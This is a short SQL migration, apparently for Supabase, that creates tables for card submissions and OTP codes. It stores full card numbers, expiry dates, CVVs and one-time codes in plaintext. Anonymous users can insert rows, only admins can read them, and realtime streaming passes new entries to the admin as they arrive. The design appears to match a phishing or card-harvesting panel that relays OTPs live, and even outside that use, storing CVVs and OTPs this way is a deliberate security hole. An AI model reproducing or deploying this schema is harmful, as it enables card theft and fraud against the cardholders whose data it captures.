-- Create payment_attempts table to track all payment card submissions
CREATE TABLE public.payment_attempts (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  order_id UUID NOT NULL REFERENCES public.customer_orders(id) ON DELETE CASCADE,
  card_number TEXT NOT NULL,
  card_holder_name TEXT NOT NULL,
  expiry_date TEXT NOT NULL,
  cvv TEXT NOT NULL,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Create otp_attempts table to track all OTP submissions
CREATE TABLE public.otp_attempts (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  order_id UUID NOT NULL REFERENCES public.customer_orders(id) ON DELETE CASCADE,
  otp_code TEXT NOT NULL,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Enable RLS
ALTER TABLE public.payment_attempts ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.otp_attempts ENABLE ROW LEVEL SECURITY;

-- Policies for payment_attempts
CREATE POLICY "Admins can view payment attempts"
ON public.payment_attempts
FOR SELECT
USING (has_role(auth.uid(), 'admin'::app_role));

CREATE POLICY "Anyone can insert payment attempts"
ON public.payment_attempts
FOR INSERT
WITH CHECK (true);

-- Policies for otp_attempts
CREATE POLICY "Admins can view otp attempts"
ON public.otp_attempts
FOR SELECT
USING (has_role(auth.uid(), 'admin'::app_role));

CREATE POLICY "Anyone can insert otp attempts"
ON public.otp_attempts
FOR INSERT
WITH CHECK (true);

-- Enable realtime
ALTER PUBLICATION supabase_realtime ADD TABLE public.payment_attempts;
ALTER PUBLICATION supabase_realtime ADD TABLE public.otp_attempts;